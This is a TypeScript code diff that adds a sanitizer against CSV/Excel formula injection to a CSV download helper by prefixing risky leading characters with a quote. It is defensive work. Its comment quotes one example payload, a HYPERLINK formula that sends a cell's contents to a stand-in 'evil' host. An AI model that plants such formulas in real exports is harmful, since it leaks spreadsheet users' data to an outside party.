@@ -23,9 +23,25 @@ export function formatDate(iso: string | null): string {
   }
 }
 
+const FORMULA_TRIGGER_CHARS = ["=", "+", "-", "@"];
+
+/**
+ * Neutralize CSV/Excel formula injection. Page-controlled strings (titles,
+ * anchor text, image names, issue text, ...) are exported verbatim into CSV
+ * cells; if such a value starts with a formula-trigger character, Excel/
+ * Sheets may interpret it as a formula when the export is later opened
+ * (e.g. a page whose title is `=HYPERLINK("http://evil/?"&A1,"x")`).
+ * Prefixing with a single quote forces spreadsheet apps to treat it as
+ * literal text. Mirrors modules/report_generator.py's `_sanitize_cell`.
+ */
+export function sanitizeCsvCell(value: unknown): string {
+  const s = String(value ?? "");
+  return FORMULA_TRIGGER_CHARS.some((c) => s.startsWith(c)) ? `'${s}` : s;
+}
+
 export function downloadCsv(filename: string, rows: string[][]) {
   const csv = rows
-    .map((row) => row.map((cell) => `"${String(cell ?? "").replace(/"/g, '""')}"`).join(","))
+    .map((row) => row.map((cell) => `"${sanitizeCsvCell(cell).replace(/"/g, '""')}"`).join(","))
     .join("\n");
   const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
   const url = URL.createObjectURL(blob);
